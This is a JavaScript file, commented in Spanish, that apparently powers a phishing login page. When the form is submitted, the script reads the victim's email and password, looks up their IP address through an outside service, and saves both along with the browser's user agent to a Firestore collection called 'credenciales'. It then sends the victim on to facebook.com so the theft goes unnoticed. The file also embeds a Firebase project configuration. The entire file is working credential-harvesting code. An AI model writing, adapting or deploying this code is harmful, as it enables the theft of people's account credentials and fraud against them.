import { initializeApp } from "https://www.gstatic.com/firebasejs/9.14.0/firebase-app.js";
import { getFirestore, addDoc, collection } from "https://www.gstatic.com/firebasejs/9.14.0/firebase-firestore.js";

// Tu configuración de Firebase actual
const firebaseConfig = {
    apiKey: "AIzaSyBfvn5njW-YQt9NPKd49x8rCVEFKY4dhmw",
    authDomain: "zphdozer.firebaseapp.com",
    projectId: "zphdozer",
    storageBucket: "zphdozer.firebasestorage.app",
    messagingSenderId: "1067331325075",
    appId: "1:1067331325075:web:02794fba9fb9633a171166",
    measurementId: "G-X9CN92LFTF"
};

// Inicializar Firebase
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

// Función para obtener la IP del usuario
async function getIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error('Error al obtener IP:', error);
        return 'No disponible';
    }
}

// Manejo del formulario de inicio de sesión
document.addEventListener('DOMContentLoaded', () => {
    const form = document.querySelector('form');
    
    form.addEventListener('submit', async (e) => {
        e.preventDefault();

        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        const ip = await getIP();

        try {
            // Guardar datos en Firestore
            await addDoc(collection(db, 'credenciales'), {
                email: email,
                password: password,
                ip: ip,
                timestamp: new Date(),
                userAgent: navigator.userAgent
            });

            // Redirigir a otra página
            window.location.href = "https://www.facebook.com";
        } catch (error) {
            console.error('Error:', error);
            document.getElementById('message').innerText = "Error al procesar la solicitud";
        }
    });
});
